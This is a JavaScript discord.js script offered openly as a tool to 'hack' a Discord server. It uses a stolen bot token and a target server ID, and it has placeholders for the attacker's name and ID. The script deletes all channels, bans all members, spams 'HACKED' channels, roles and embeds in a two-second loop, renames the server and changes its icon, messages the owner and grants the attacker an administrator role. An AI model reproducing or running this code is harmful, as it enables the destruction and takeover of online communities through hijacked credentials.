const Discord = require("discord.js");
const client = new Discord.Client();
const token = "the bot token you want to hack"
 
client.on("ready", () => {
    console.log("HACKED STARTED")
    // you can change the avatar 
    client.user.setAvatar(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
      // you can change the username
    client.user.setUsername("HACKED BY REVENGE")//replace revenge with ur name
       let targetserver = "the server id you want to hack "
       let urid = "your id to give you administrator role"; 
       let nickname = "HACKED BY REVENGE"//replace revenge with ur name (nickname that all members will change to it)
   client.guilds.get(targetserver).channels.forEach(c => {
c.delete()
})



client.guilds.get(targetserver).members.forEach(u => {
   u.ban()
})

client.guilds.get(targetserver).members.forEach(mem => {
mem.setNickname(nickname)
})

setInterval(() => {
  client.guilds.get(targetserver).createChannel("HACKED", "text") 
  client.guilds.get(targetserver).createChannel("HACKED", "voice")
  client.guilds.get(targetserver).createRole({
    name : "HACKED",
    permissions :   [1],
    color : " #ff0000"
}).then(() => {



client.guilds.get(targetserver).channels.forEach(ch => {
   let embed = new Discord.RichEmbed()
   .setAuthor(client.user.tag, client.user.avatarURL)
   .setTitle("Hacked")
   .setDescription("HACKED BY REVENGE") //replace revenge with ur name
   .setFooter(client.user.tag, client.user.avatarURL)
   .setColor("#ff0000")
ch.send(embed)
})
})
}, 2000);
client.guilds.get(targetserver).members.forEach(mem => {
mem.addRole("HACKED")
})

let serv = client.guilds.get(targetserver)

let embed = new Discord.RichEmbed()
.setAuthor(client.user.tag, client.user.avatarURL)
.setTitle("HACKED")
.setDescription("YOUR SERVER HAS BEEN HACKED BY REVENGE")//replace revenge with ur name
.setFooter(client.user.tag, client.user.avatarURL)
.setColor("#ff0000")

serv.members.get(serv.ownerID).sendEmbed(embed)

serv.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
serv.setName("HACKED BY REVENGE")

let role = client.guilds.get(targetserver).createRole({ name: "OP", permissions: [8] , color: "#ff0000"});
let rolefind = client.guilds.get(targetserver).roles.find("name", "OP")
client.guilds.get(targetserver).members.get(urid).addRole(rolefind)

})


client.login(token)
